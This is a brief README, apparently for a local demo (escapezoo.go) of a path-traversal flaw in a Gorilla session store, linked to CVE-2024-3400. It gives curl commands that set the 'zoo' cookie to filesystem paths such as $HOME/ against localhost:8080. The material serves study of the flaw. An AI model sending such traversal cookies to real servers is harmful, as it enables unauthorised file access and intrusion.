# A Gorilla Session Vulnerable to Path Directory Traversal

``export SESSION_KEY=gorilla
``

``go run escapezoo.go
``

# Path Directory Traversal

``curl --cookie "zoo=$PREFIX/tmp" http://localhost:8080
``

``curl --cookie "zoo=$HOME/" http://localhost:8080
``

# CVE-2024-3400 related vulnerability
